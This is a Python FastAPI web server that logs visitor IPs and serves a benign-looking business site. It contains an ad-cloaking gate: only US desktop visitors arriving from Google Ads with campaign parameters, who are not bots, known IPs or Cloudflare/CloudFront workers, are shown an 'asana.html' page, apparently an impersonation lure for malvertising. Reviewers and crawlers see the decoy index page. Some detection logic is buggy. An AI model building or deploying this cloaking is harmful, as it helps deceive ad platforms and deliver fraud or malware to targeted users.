from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, Response
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
import json
import os
import requests
import logging
from sqlalchemy.orm import Session
from database import get_db, IPLog, init_db
from typing import List
from datetime import datetime
import re
import ipaddress
from typing import Dict, List, Optional
from fastapi import Request

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("app.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("ip_logger")

# Initialize database on startup
logger.info("Initializing database")
init_db()

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")

# Serve sitemap.xml
@app.get("/sitemap.xml")
async def sitemap():
    with open("sitemap.xml", "r") as f:
        return Response(content=f.read(), media_type="application/xml")

templates = Jinja2Templates(directory="templates")

# Empty set for known IPs if file doesn't exist
known_ips_from_file = set()

# Try to load known IPs from file (if it exists)
try:
    logger.info("Attempting to load known IPs from file")
    if os.path.exists("ip_list.json"):
        logger.info("Loading IPs from ip_list.json")
        with open("ip_list.json", "r") as file:
            known_ips_from_file = set(json.load(file)["ips"])
            logger.info(f"Loaded {len(known_ips_from_file)} known IPs from ip_list.json")
    elif os.path.exists("backup/ip_list.json"):
        logger.info("Loading IPs from backup/ip_list.json")
        with open("backup/ip_list.json", "r") as file:
            known_ips_from_file = set(json.load(file)["ips"])
            logger.info(f"Loaded {len(known_ips_from_file)} known IPs from backup/ip_list.json")
    else:
        logger.warning("No IP list file found (ip_list.json or backup/ip_list.json)")
except Exception as e:
    logger.error(f"Error loading IP list file: {e}")

def crawler_detect(user_agent: str) -> bool:
    crawlers = [
        'Google', 'Googlebot', 'google', 'msnbot', 'Rambler', 'Yahoo', 
        'AbachoBOT', 'Accoona', 'AcoiRobot', 'ASPSeek', 'CrocCrawler', 
        'Dumbot', 'FAST-WebCrawler', 'GeonaBot', 'Gigabot', 'Lycos', 
        'MSRBOT', 'Scooter', 'Altavista', 'IDBot', 'eStyle', 'Scrubby', 
        'facebookexternalhit', 'python', 'LoiLoNote', 'quic', 'Go-http', 
        'webtech', 'WhatsApp'
    ]
    
    crawlers_agents = '|'.join(crawlers)
    is_crawler = user_agent not in crawlers_agents
    if is_crawler:
        logger.debug(f"Detected crawler: {user_agent}")
    return is_crawler

async def is_user_from_usa(ip_address: str) -> bool:
    try:
        logger.info(f"Checking if IP {ip_address} is from USA")
        api_url = f"http://ip-api.com/json/{ip_address}"
        response = requests.get(api_url)
        ip_data = response.json()
        is_usa = ip_data.get('countryCode', '').upper() == "US"
        logger.info(f"IP {ip_address} is{'from USA' if is_usa else ' not from USA'}")
        return is_usa
    except Exception as e:
        logger.error(f"Error checking if IP {ip_address} is from USA: {e}")
        return False

# Check if an IP is known (from database or file)
def is_known_ip(ip: str, db: Session) -> bool:
    logger.info(f"Checking if IP {ip} is known")
    # First check database
    ip_log = db.query(IPLog).filter(IPLog.ip_address == ip, IPLog.is_known_ip == True).first()
    if ip_log:
        logger.info(f"IP {ip} is known (from database)")
        return True
        
    # Fallback to file-based check
    is_known = ip in known_ips_from_file
    if is_known:
        logger.info(f"IP {ip} is known (from file)")
        return True
    else:
        logger.info(f"IP {ip} is not known")
    return is_known

# Save IP to database with GCLID and placement
def save_ip(ip: str, gclid_value: str, placement_value: str, db: Session):
    logger.info(f"Saving IP {ip} to database" + 
                (f" with GCLID {gclid_value}" if gclid_value else "") + 
                (f" and placement {placement_value}" if placement_value else ""))
    
    # Check if IP already exists
    ip_log = db.query(IPLog).filter(IPLog.ip_address == ip).first()
    
    if ip_log:
        # Update existing entry
        logger.info(f"IP {ip} already exists in database, updating")
        if gclid_value:
            ip_log.has_gclid = True
            ip_log.gclid = gclid_value
            logger.info(f"Updated GCLID for IP {ip}")
        
        if placement_value:
            ip_log.placement = placement_value
            logger.info(f"Updated placement for IP {ip}")
            
        db.commit()
        logger.info(f"Committed update for IP {ip}")
    else:
        # Create new entry
        logger.info(f"IP {ip} does not exist in database, creating new entry")
        ip_log = IPLog(
            ip_address=ip, 
            has_gclid=bool(gclid_value),
            gclid=gclid_value,
            placement=placement_value
        )
        db.add(ip_log)
        db.commit()
        logger.info(f"Added new IP {ip} to database")


async def detect_service_workers(request: Request) -> Dict[str, any]:
    """
    Detect service workers and bots from request.
    Returns a dictionary with detection results.
    
    Usage:
    @app.get("/some-route")
    async def some_route(request: Request):
        detection = await detect_service_workers(request)
        if detection["is_service_worker"]:
            return {"error": "Service workers not allowed"}, 403
    """
    
    # Cloudflare IP ranges (partial list - include all from https://www.cloudflare.com/ips/)
    CLOUDFLARE_IP_RANGES = [
        "173.245.48.0/20",
        "103.21.244.0/22",
        "103.22.200.0/22",
        "141.101.64.0/18",
        "108.162.192.0/18",
        "198.41.128.0/17",
        "172.64.0.0/13",
        "131.0.72.0/22",
        "2400:cb00::/32",
        "2606:4700::/32",
        "2803:f800::/32"
    ]
    
    # Cloudfront domains and patterns
    CLOUDFRONT_DOMAINS = [r"cloudfront\.net", r"awsdns-\d+\.(com|net|org)"]
    
    # Service worker headers to check
    SERVICE_WORKER_HEADERS = {
        "via": r"cloudfront|amazonaws",
        "x-amz-cf-id": r".+",  # Cloudfront
        "x-forwarded-host": r"cloudfront",
    }
    
    # Compile patterns for better performance
    cloudfront_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in CLOUDFRONT_DOMAINS]
    header_patterns = {header: re.compile(pattern, re.IGNORECASE) for header, pattern in SERVICE_WORKER_HEADERS.items()}
    
    # Initialize detection results
    detection = {
        "is_service_worker": False,
        "is_cloudflare": False,
        "is_cloudfront": False,
        "detected_services": [],
        "client_ip": request.client.host if request.client else None,
        "real_ip": request.headers.get("x-real-ip"),
        "x_forwarded_for": request.headers.get("x-forwarded-for"),
        "user_agent": request.headers.get("user-agent"),
        "request_headers": dict(request.headers)
    }
    
    logger.info(f"Checking for service workers and cloudflare on ip: {detection['client_ip']}")

    # Check IP against Cloudflare ranges
    if detection["client_ip"]:
        try:
            ip = ipaddress.ip_address(detection["client_ip"])
            cloudflare_networks = [ipaddress.ip_network(range) for range in CLOUDFLARE_IP_RANGES]
            logger.info("entered cloudflare check")
            if any(ip in network for network in cloudflare_networks):
                logger.info(f"Cloudflare IP: {detection['client_ip']}")
                detection["is_cloudflare"] = True
            if "worker" in detection["user_agent"].lower():
                detection["is_service_worker"] = True
                logger.info(f"Service Worker: {detection['user_agent']}")
                detection["detected_services"].append("Cloudflare IP")
                if detection["real_ip"]:
                    logger.info(f"Real IP: {detection['real_ip']}")
                if detection["x_forwarded_for"]:
                    logger.info(f"X-Forwarded-For: {detection['x_forwarded_for']}")
        except ValueError:
            pass
    else:
        logger.info("No IP found. trying real IP")
        if detection["real_ip"]:
            try:
                ip = detection["real_ip"]
                cloudflare_networks = [ipaddress.ip_network(range) for range in CLOUDFLARE_IP_RANGES]
                logger.info("entered cloudflare check")
                if any(ip in network for network in cloudflare_networks):
                    logger.info(f"Cloudflare IP: {detection['real_ip']}")
                    detection["is_cloudflare"] = True
                if "worker" in detection["user_agent"].lower():
                    detection["is_service_worker"] = True
                    logger.info(f"Service Worker: {detection['user_agent']}")
                detection["detected_services"].append("Cloudflare IP")
            except ValueError:
                pass

    
    # Check headers for service worker indicators
    for header, pattern in header_patterns.items():
        if header in request.headers and pattern.search(request.headers[header]):
            service_name = "Cloudfront" if "amz" in header else "Service Worker"
            detection["detected_services"].append(f"{service_name} header: {header}")
            
            if "cloudflare" in service_name.lower():
                detection["is_cloudflare"] = True
            elif "cloudfront" in service_name.lower():
                detection["is_cloudfront"] = True
    
    # Check host header against known service worker domains
    host = request.headers.get("host", "")
    if any(pattern.search(host) for pattern in cloudfront_patterns):
        if "worker" in detection["user_agent"].lower():
            detection["is_service_worker"] = True
        detection["is_cloudfront"] = True
        detection["detected_services"].append(f"Cloudfront domain: {host}")
    
    # Check User-Agent for common service worker patterns
    user_agent = detection["user_agent"] or ""
    service_worker_ua_patterns = [
        r"cloudfront", r"worker", r"aws", 
        r"amazon", r"bot", r"crawl", r"fetch"
    ]
    
    if any(re.search(pattern, user_agent, re.IGNORECASE) for pattern in service_worker_ua_patterns):
        detection["is_service_worker"] = True
        detection["detected_services"].append(f"Service Worker User-Agent: {user_agent}")
    
    return detection


@app.get("/", response_class=HTMLResponse)
async def root(request: Request, db: Session = Depends(get_db)):
    
    request_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_host = request.client.host
    logger.info("New request received #########################################################")
    logger.info(f"[{request_time}] Received request from IP: {client_host}")
    
    query_params = request.query_params
    logger.info(f"Query parameters: {dict(query_params)}")
    
    # Get query parameters these are custom parameters set in final url of campaign
    gclid = query_params.get("gclid")
    campaignid = query_params.get("utm_campaign")
    placement = query_params.get("utm_content")
    
    # Check conditions
    is_from_google_ads = gclid is not None
    if gclid == "{gclid}":
        logger.info("gclid is {gclid}")

    if not is_from_google_ads:
        logger.info("Request is not from Google Ads, showing index.html")
        return templates.TemplateResponse("index.html", {"request": request})
    else:
        logger.info(f"Request is from Google Ads: {is_from_google_ads}")

    
    user_agent = request.headers.get('user-agent', '')
    logger.info(f"User Agent: {user_agent}")
    
    is_windows_desktop = 'Windows' in user_agent or 'Macintosh' in user_agent
    logger.info(f"Is Windows/ MAC Desktop: {is_windows_desktop}")
    is_ads_bot = 'adbeat.com/policy' in user_agent
    logger.info(f"Is Ads Bot: {is_ads_bot}")
    # Check if user is from USA (only when coming from Google Ads)
    is_usa = False
    if is_from_google_ads:
        is_usa = await is_user_from_usa(client_host)
    logger.info(f"Is from USA: {is_usa}")
    logger.info(f"campaignid: {campaignid}")
    logger.info(f"placement: {placement}")
    logger.info(f"gclid: {gclid}")

    if not is_usa:
        logger.info("User is not from USA, showing index.html")
        return templates.TemplateResponse("index.html", {"request": request})
    
    # Check additional parameters
    additional_params_condition = all([
        is_from_google_ads, 
        is_usa, 
        is_windows_desktop, 
        campaignid, 
        placement, 
    ])
    logger.info(f"All additional parameters present: {additional_params_condition}")
    
    # Bot detection
    user_agent_lower = user_agent.lower()
    is_bot = any([
        'bot' in user_agent_lower,
        'crawl' in user_agent_lower,
        'spider' in user_agent_lower,
        'slurp' in user_agent_lower
    ])
    logger.info(f"Is bot: {is_bot}")
    
    # Log IP addresses to database with actual GCLID value if present
    save_ip(client_host, gclid_value=gclid, placement_value=placement, db=db)
    
    # If IP is in known_ips list, show index.html directly
    if is_known_ip(client_host, db):
        logger.info(f"IP {client_host} is known, showing index.html")
        return templates.TemplateResponse("index.html", {"request": request})
    
    detection = await detect_service_workers(request)
    if detection["is_cloudflare"] and not detection["is_service_worker"]:
        logger.info(f"Cloudflare detected but not a service worker")
    
    if detection["is_cloudfront"] and not detection["is_service_worker"]:
        logger.info("Cloudfront detected but not a service worker")
    
    if detection["is_service_worker"]:
        logger.info("Service worker detected outside the function call, returning index.html")
        return templates.TemplateResponse("index.html", {"request": request})
    
    # Redirect condition
    if all([
        is_from_google_ads,
        is_usa,
        is_windows_desktop,
        campaignid,
        placement,
        not is_bot,
        not detection["is_service_worker"],
    ]):
        try:
            logger.info(f"All conditions met, showing asana.html to IP {client_host}")
            return templates.TemplateResponse("asana.html", {"request": request})
        except FileNotFoundError:
            logger.error("index.html not found")
            raise HTTPException(status_code=404, detail="page not found")
    else:
        try:
            logger.info(f"Not all conditions met, showing index.html to IP {client_host}")
            return templates.TemplateResponse("index.html", {"request": request})
        except FileNotFoundError:
            logger.error("index.html not found")
            raise HTTPException(status_code=404, detail="index.html not found")

@app.get("/all-ips/")
async def get_all_ips(db: Session = Depends(get_db)):
    logger.info("Request to view all IPs")
    ip_logs = db.query(IPLog).all()
    logger.info(f"Found {len(ip_logs)} IPs in database")
    
    # Convert to structured format with GCLID info
    ip_list = []
    for ip_log in ip_logs:
        ip_data = {
            "ip_address": ip_log.ip_address,
            "has_gclid": ip_log.has_gclid,
            "is_known_ip": ip_log.is_known_ip
        }
        
        # Include GCLID if it exists
        if ip_log.gclid:
            ip_data["gclid"] = ip_log.gclid
            
        # Include placement if it exists
        if ip_log.placement:
            ip_data["placement"] = ip_log.placement
            
        ip_list.append(ip_data)
    
    logger.info("Returning all IPs")
    return {"logged_ips": ip_list}

@app.get("/", response_class=HTMLResponse)
@app.get("/index.html", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.get("/about.html", response_class=HTMLResponse)
async def about(request: Request):
    return templates.TemplateResponse("about.html", {"request": request})

@app.get("/service.html", response_class=HTMLResponse)
async def service(request: Request):
    return templates.TemplateResponse("service.html", {"request": request})

@app.get("/class.html", response_class=HTMLResponse)
async def class_schedule(request: Request):
    return templates.TemplateResponse("class.html", {"request": request})

@app.get("/price.html", response_class=HTMLResponse)
async def price(request: Request):
    return templates.TemplateResponse("price.html", {"request": request})

@app.get("/contact.html", response_class=HTMLResponse)
async def contact(request: Request):
    return templates.TemplateResponse("contact.html", {"request": request})

@app.get("/privacy-policy.html", response_class=HTMLResponse)
async def privacy_policy(request: Request):
    return templates.TemplateResponse("privacy-policy.html", {"request": request})

@app.get("/team.html", response_class=HTMLResponse)
async def team(request: Request):
    return templates.TemplateResponse("team.html", {"request": request})

@app.get("/portfolio.html", response_class=HTMLResponse)
async def portfolio(request: Request):
    return templates.TemplateResponse("portfolio.html", {"request": request})
    

if __name__ == "__main__":
    logger.info("Starting server")
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
